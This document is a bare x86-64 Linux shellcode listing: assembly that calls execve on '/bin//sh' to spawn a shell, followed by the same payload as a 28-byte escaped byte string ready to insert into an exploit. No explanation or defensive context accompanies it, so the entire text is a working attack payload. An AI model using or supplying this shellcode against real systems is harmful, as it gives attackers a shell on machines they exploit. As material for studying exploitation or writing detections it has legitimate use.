section .text
    global _start

_start:
    xor rax, rax
    xor rsi, rsi
    xor rdx, rdx

    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi

    mov rdi, rsp
    mov al, 0x3b
    syscall

; \x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05
; 28 bytes
